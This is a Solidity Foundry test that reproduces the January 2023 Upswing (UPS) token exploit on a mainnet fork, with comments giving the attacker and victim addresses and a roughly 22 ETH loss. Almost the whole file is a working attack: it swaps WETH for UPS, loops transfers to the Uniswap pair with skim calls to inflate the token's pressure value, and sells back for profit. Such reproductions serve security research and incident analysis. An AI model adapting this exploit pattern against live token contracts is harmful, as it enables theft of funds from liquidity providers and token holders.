// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/console2.sol";
import "forge-std/Test.sol";
import "./../interface.sol";

// Total Lost: ~22 ETH
// Attacker: 0xceed34f03a3e607cc04c2d0441c7386b190d7cf4
// Attack Contract: 0x762d2a9f065304d42289f3f13cc8ea23226d3b8c
// Vulnerable Contract: 0x35a254223960c18B69C0526c46B013D022E93902
// Attack Tx: https://etherscan.io/tx/0x4b3df6e9c68ae482c71a02832f7f599ff58ff877ec05fed0abd95b31d2d7d912
//
// block 16433821

// @Analysis
// https://twitter.com/QuillAudits/status/1615634917802807297

interface ITokenUPS is IERC20 {
    function myPressure(address _address) external view returns (uint256);
}

contract UpswingExploit is Test {
    Uni_Router_V2 uniRouter = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Pair lp = IUniswapV2Pair(0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34);
    address upsToken = 0x35a254223960c18B69C0526c46B013D022E93902;
    address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    function setUp() public {
        vm.createSelectFork("mainnet", 16_433_820); // Fork mainnet at block 16433820
        vm.label(address(uniRouter), "uniRouterV2");
        vm.label(upsToken, "upsToken");
        vm.label(weth, "weth");
    }

    function testExploit() public {
        // sample attack with 1 ether
        deal(weth, address(this), 1 ether);
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = upsToken;

        IERC20(weth).approve(address(uniRouter), type(uint256).max);

        uniRouter.swapExactTokensForTokens(1 ether, 0, path, address(this), block.timestamp); // => (amounts=[1000000000000000000, 199388836791259039979218])

        console.log("prev preassure", ITokenUPS(upsToken).myPressure(address(this)));

        uint256 balance = IERC20(upsToken).balanceOf(address(this));
        for (uint256 i; i < 8; ++i) {
            IERC20(upsToken).transfer(address(lp), balance);
            lp.skim(address(this));
        }

        console.log("after fake swaps preassure", ITokenUPS(upsToken).myPressure(address(this)));

        IERC20(upsToken).transfer(address(this), 0);

        path[0] = upsToken;
        path[1] = weth;

        balance = IERC20(upsToken).balanceOf(address(this));
        IERC20(upsToken).approve(address(uniRouter), type(uint256).max);
        uniRouter.swapExactTokensForTokens(balance, 0, path, address(this), block.timestamp); // => (amounts=[1000000000000000000, 199388836791259039979218])

        console.log("profit!", IERC20(weth).balanceOf(address(this)) - 1 ether);
        emit log_named_decimal_uint(
            "After exploiting, Attacker WETH Balance", IERC20(weth).balanceOf(address(this)) - 1 ether, 18
        );
    }
}
